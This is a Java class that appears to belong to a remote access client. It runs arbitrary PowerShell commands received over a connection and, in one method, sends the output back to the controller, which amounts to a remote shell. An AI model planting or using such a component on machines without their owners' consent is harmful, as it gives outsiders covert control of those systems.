package client.features;

import client.connection.ClientConnection;
import client.connection.ID;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ShellCommandExecutor {
    private static volatile String returnStr;

    public static void executeShellCommand(String powerShellScript, ClientConnection connection) throws Exception {
        returnStr = "Out of time";
        new Thread(() -> {
            try {
                ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-Command", powerShellScript);
                processBuilder.redirectErrorStream(true);

                Process process = processBuilder.start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
                returnStr = output.toString().isEmpty()?"None return\n":output.toString();
                connection.sendMessage(ID.SHELL_OUT(),"Shell Return: \n" +returnStr);
                System.gc();
            } catch (Exception e) {
                // 捕获异常并记录错误信息
                returnStr = "error: " + e.getMessage();
                System.gc();
            }
        }).start();


    }

    public static void executeShellCommand(String powerShellScript) {
        new Thread(() -> {
            try {
                ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-Command", powerShellScript);
                processBuilder.redirectErrorStream(true);
                Process process = processBuilder.start();
                process.waitFor();
                System.gc();
            } catch (IOException | InterruptedException ignored) {
            }
        }).start();
    }
}
